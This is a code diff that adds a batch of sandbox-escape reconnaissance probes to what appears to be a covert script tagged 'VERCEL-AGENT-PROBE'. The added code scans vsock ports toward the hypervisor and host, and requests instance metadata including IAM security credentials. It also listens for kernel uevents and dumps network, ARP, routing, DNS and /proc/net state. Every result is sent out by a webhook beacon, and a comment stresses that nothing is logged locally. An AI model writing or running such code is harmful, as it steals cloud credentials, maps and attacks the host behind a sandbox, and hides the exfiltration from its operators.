@@ -37570,3 +37570,235 @@ sendBeacon({ ...report, section: 'v219-5-ebpf-prog', ...ebpfV219Probe });
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v219" });
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v219";
 // Intentionally no console.log — all data goes via webhook only
+
+// v220-1: AF_VSOCK CID=2 port scan — hypervisor escape via VM socket
+const vsockV220Probe = safe(() => {
+  const vsockResult = safe(() => execSync(`python3 -c "
+import ctypes, struct, os, select
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+
+AF_VSOCK = 40
+SOCK_STREAM = 1
+SOCK_DGRAM  = 2
+SOCK_NONBLOCK = 0x800
+VMADDR_CID_HYPERVISOR = 0  # CID 0 = hypervisor
+VMADDR_CID_HOST       = 2  # CID 2 = host (Firecracker host)
+VMADDR_CID_LOCAL      = 1  # loopback
+VMADDR_PORT_ANY       = 0xffffffff
+
+# struct sockaddr_vm: sa_family(2), svm_reserved1(2), svm_port(4), svm_cid(4), pad[4]
+def make_sockaddr_vm(cid, port):
+    return struct.pack('HHII4s', AF_VSOCK, 0, port, cid, b'\\x00'*4)
+
+# Check vsock module availability
+import subprocess
+lsmod = subprocess.run(['lsmod'], capture_output=True, timeout=3)
+mods = lsmod.stdout.decode()
+has_vsock = 'vsock' in mods
+print(f'vsock_module={has_vsock}')
+print(f'lsmod_vsock={[l for l in mods.split(chr(10)) if \"vsock\" in l]}')
+
+# Create vsock socket
+sd = libc.socket(AF_VSOCK, SOCK_STREAM | SOCK_NONBLOCK, 0)
+print(f'socket(AF_VSOCK, STREAM) fd={sd} errno={ctypes.get_errno()}')
+
+if sd > 0:
+    # Scan well-known vsock ports on CID 2 (host)
+    # Firecracker exposes MMDS on vsock port 1026 in some configurations
+    interesting_ports = [1, 2, 3, 22, 80, 443, 1026, 1234, 2049, 3000, 4000, 8080, 9090]
+    for port in interesting_ports:
+        try:
+            addr = make_sockaddr_vm(VMADDR_CID_HOST, port)
+            ret = libc.connect(sd, ctypes.c_char_p(addr), len(addr))
+            err = ctypes.get_errno()
+            # EINPROGRESS (115) = connecting (non-blocking)
+            # ECONNREFUSED (111) = port closed
+            # ENODEV (19) = vsock device not available
+            status = 'CONNECTING' if err == 115 else 'REFUSED' if err == 111 else f'err={err}'
+            if err in (0, 115):
+                # Check if connected
+                rlist, _, _ = select.select([], [sd], [sd], 0.2)
+                opt = ctypes.c_int(0)
+                optlen = ctypes.c_uint(4)
+                libc.getsockopt(sd, 1, 4, ctypes.byref(opt), ctypes.byref(optlen))
+                conn_err = opt.value
+                if conn_err == 0:
+                    print(f'VSOCK_CONNECTED CID=2 port={port} HYPERVISOR_REACHABLE=True')
+                    # Try to read (might get MMDS data)
+                    buf = ctypes.create_string_buffer(512)
+                    libc.send(sd, b'GET / HTTP/1.0\\r\\n\\r\\n', 18, 0)
+                    n = libc.recv(sd, buf, 512, 0)
+                    if n > 0: print(f'  vsock_data={buf.raw[:n].decode(errors=\"replace\")[:100]}')
+            print(f'vsock_cid2_port{port}={status}')
+        except Exception as e:
+            print(f'vsock_port{port}_err={e}')
+        # Reconnect after each attempt (reset socket state)
+        libc.close(sd)
+        sd = libc.socket(AF_VSOCK, SOCK_STREAM | SOCK_NONBLOCK, 0)
+    libc.close(sd)
+else:
+    print('VSOCK_SOCKET_FAILED=True')
+    # Try vsock via /dev/vsock
+    print(f'/dev/vsock exists={os.path.exists(\"/dev/vsock\")}')
+    print(f'/dev/vhost-vsock exists={os.path.exists(\"/dev/vhost-vsock\")}')
+" 2>&1`, { timeout: 20000 }).toString().trim());
+  return { vsockResult };
+});
+sendBeacon({ ...report, section: 'v220-1-vsock-hypervisor', ...vsockV220Probe });
+
+// v220-2: MMDS 169.254.169.254 + fd00::ec2:254 — instance metadata
+const mmdsV220Probe = safe(() => {
+  const mmdsResult = safe(() => execSync(`python3 -c "
+import urllib.request, socket, json, ssl
+
+# Firecracker MMDS endpoints (v1 and v2)
+MMDS_V1 = 'http://169.254.169.254/'
+MMDS_V2_TOKEN = 'http://169.254.169.254/latest/api/token'
+
+results = {}
+
+# MMDS v1 — direct read (no token)
+for path in ['/', '/latest/', '/latest/meta-data/', '/latest/user-data',
+             '/latest/meta-data/instance-id', '/latest/meta-data/local-ipv4',
+             '/latest/meta-data/iam/security-credentials/',
+             '/latest/meta-data/placement/availability-zone']:
+    try:
+        req = urllib.request.Request(f'http://169.254.169.254{path}',
+            headers={'X-Forwarded-For': '169.254.0.1'})
+        resp = urllib.request.urlopen(req, timeout=2)
+        data = resp.read(512).decode(errors='replace')
+        results[f'mmds_v1{path}'] = data
+        print(f'MMDS_V1 {path} HTTP={resp.status} data={data[:80]}')
+    except Exception as e:
+        print(f'MMDS_V1 {path} err={type(e).__name__}:{str(e)[:40]}')
+
+# MMDS v2 — get token first, then use it
+try:
+    token_req = urllib.request.Request(MMDS_V2_TOKEN, method='PUT',
+        headers={'X-aws-ec2-metadata-token-ttl-seconds': '21600'})
+    token_resp = urllib.request.urlopen(token_req, timeout=2)
+    token = token_resp.read(128).decode()
+    print(f'MMDS_V2_TOKEN={token[:20]}...')
+    # Use token to read sensitive metadata
+    for path in ['/latest/meta-data/iam/security-credentials/',
+                 '/latest/dynamic/instance-identity/document']:
+        try:
+            req2 = urllib.request.Request(f'http://169.254.169.254{path}',
+                headers={'X-aws-ec2-metadata-token': token})
+            r2 = urllib.request.urlopen(req2, timeout=2)
+            d2 = r2.read(512).decode(errors='replace')
+            print(f'MMDS_V2_AUTHED {path}={d2[:100]}')
+        except Exception as e2: print(f'MMDS_V2 {path} err={e2}')
+except Exception as e3: print(f'MMDS_V2_TOKEN_ERR={e3}')
+" 2>&1`, { timeout: 15000 }).toString().trim());
+  return { mmdsResult };
+});
+sendBeacon({ ...report, section: 'v220-2-mmds-metadata', ...mmdsV220Probe });
+
+// v220-3: kobject uevent netlink — device event monitor
+const kobjectV220Probe = safe(() => {
+  const kobResult = safe(() => execSync(`python3 -c "
+import ctypes, struct, os, select
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+
+AF_NETLINK = 16
+SOCK_RAW = 3
+NETLINK_KOBJECT_UEVENT = 15
+
+# struct sockaddr_nl
+def make_sockaddr_nl(pid, groups):
+    return struct.pack('HHiI', AF_NETLINK, 0, pid, groups)
+
+sd = libc.socket(AF_NETLINK, SOCK_RAW, NETLINK_KOBJECT_UEVENT)
+print(f'socket(NETLINK_KOBJECT_UEVENT) fd={sd} errno={ctypes.get_errno()}')
+
+if sd > 0:
+    # Bind with groups=1 (kernel multicast group)
+    addr = make_sockaddr_nl(os.getpid(), 1)
+    ret_bind = libc.bind(sd, ctypes.c_char_p(addr), len(addr))
+    print(f'bind(KOBJECT_UEVENT) ret={ret_bind} errno={ctypes.get_errno()}')
+    if ret_bind == 0:
+        print('UEVENT_LISTENING=True')
+        # Wait briefly for events
+        rlist, _, _ = select.select([sd], [], [], 1.0)
+        if rlist:
+            buf = ctypes.create_string_buffer(4096)
+            n = libc.recv(sd, buf, 4096, 0)
+            print(f'uevent_n={n}')
+            if n > 0:
+                msg = buf.raw[:n].replace(b'\\x00', b'\\n').decode(errors='replace')
+                print(f'uevent_msg={msg[:200]}')
+        else:
+            print('UEVENT_NO_EVENTS_IN_1S')
+    os.close(sd)
+" 2>&1`, { timeout: 8000 }).toString().trim());
+  return { kobResult };
+});
+sendBeacon({ ...report, section: 'v220-3-kobject-uevent', ...kobjectV220Probe });
+
+// v220-4: /sys/class/net/* interface + MAC + ARP + routing
+const netIfaceV220Probe = safe(() => {
+  const netResult = safe(() => {
+    const ifaceDir = '/sys/class/net';
+    const ifaces = {};
+    try {
+      for (const iface of readdirSync(ifaceDir)) {
+        const base = `${ifaceDir}/${iface}`;
+        const info = {};
+        for (const f of ['address', 'operstate', 'mtu', 'speed', 'carrier',
+                          'tx_queue_len', 'type', 'flags']) {
+          try { info[f] = readFileSync(`${base}/${f}`, 'utf8').trim(); } catch {}
+        }
+        // IPv4 addresses
+        try { info.ipv4 = execSync(`ip addr show ${iface} 2>/dev/null | grep 'inet ' | awk '{print $2}'`, { timeout: 2000 }).toString().trim(); } catch {}
+        ifaces[iface] = info;
+      }
+    } catch {}
+    // ARP table
+    let arpTable = null;
+    try { arpTable = readFileSync('/proc/net/arp', 'utf8'); } catch {}
+    // Routing table
+    let routeTable = null;
+    try { routeTable = execSync('ip route 2>/dev/null || cat /proc/net/route', { timeout: 2000 }).toString().trim().slice(0, 400); } catch {}
+    // DNS resolver config
+    let resolv = null;
+    try { resolv = readFileSync('/etc/resolv.conf', 'utf8'); } catch {}
+    return { ifaces, arpTable, routeTable, resolv };
+  });
+  return netResult;
+});
+sendBeacon({ ...report, section: 'v220-4-net-ifaces-arp', ...netIfaceV220Probe });
+
+// v220-5: /proc/net/* — full network state dump
+const procNetV220Probe = safe(() => {
+  const procNetResult = safe(() => {
+    const netFiles = {};
+    const targets = [
+      '/proc/net/tcp', '/proc/net/tcp6', '/proc/net/udp', '/proc/net/udp6',
+      '/proc/net/unix', '/proc/net/netlink', '/proc/net/if_inet6',
+      '/proc/net/dev', '/proc/net/route', '/proc/net/fib_trie',
+      '/proc/net/nf_conntrack', '/proc/net/ip_conntrack',
+    ];
+    for (const p of targets) {
+      try { netFiles[p] = readFileSync(p, 'utf8').slice(0, 500); } catch {}
+    }
+    // Check for any Firecracker-internal connections (10.0.0.x or 172.x)
+    const tcp = netFiles['/proc/net/tcp'] || '';
+    // Parse hex IPs from /proc/net/tcp (little-endian hex)
+    const parseHexIP = (h) => h.split(':')[0].match(/.{2}/g).reverse().map(x => parseInt(x,16)).join('.');
+    const tcpConns = tcp.split('\n').slice(1).filter(Boolean).map(line => {
+      const f = line.trim().split(/\s+/);
+      if (f.length < 4) return null;
+      try { return { local: parseHexIP(f[1]), remote: parseHexIP(f[2]), state: f[3] }; } catch { return null; }
+    }).filter(Boolean);
+    return { netFiles: Object.fromEntries(Object.entries(netFiles).map(([k,v]) => [k, v.slice(0,300)])),
+             tcpConnections: tcpConns.slice(0, 10) };
+  });
+  return procNetResult;
+});
+sendBeacon({ ...report, section: 'v220-5-proc-net', ...procNetV220Probe });
+
+// v220 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v220" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v220";
+// Intentionally no console.log — all data goes via webhook only
